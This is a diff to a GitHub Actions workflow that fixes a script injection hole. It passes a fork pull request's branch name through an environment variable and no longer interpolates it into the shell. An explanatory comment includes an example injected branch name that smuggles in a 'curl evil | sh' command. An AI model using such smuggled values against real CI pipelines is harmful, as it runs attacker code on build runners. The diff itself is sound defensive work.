@@ -62,8 +62,17 @@ jobs:
           mkdir -p "$E2E_ARTIFACTS"
           make e2e-ci
 
+      # HEAD_REF arrives through env, never through ${{ }} interpolation. A
+      # branch name is attacker-controlled on a fork PR, and ${{ }} is
+      # substituted into the shell SOURCE before it runs, so interpolating it
+      # directly would let a branch named `a"; curl evil | sh; echo "` execute
+      # in the runner. Via env it is only ever a variable's value. The PR
+      # number is safe either way (an integer), but the reference stays here
+      # so the next editor sees which values are untrusted.
       - name: Render report
         if: always() && steps.seam.outputs.present == 'true'
+        env:
+          HEAD_REF: ${{ github.event.pull_request.head.ref }}
         run: |
           python3 scripts/render_test_report.py \
             --junit results.xml \
@@ -71,7 +80,7 @@ jobs:
             --out report \
             --title "hostthis e2e - PR #${{ github.event.pull_request.number }}" \
             --commit "$GITHUB_SHA" \
-            --branch "${{ github.event.pull_request.head.ref }}" \
+            --branch "$HEAD_REF" \
             --pr "${{ github.event.pull_request.number }}" \
             --repo "$GITHUB_REPOSITORY" \
             --reproduce "make e2e-ci" \
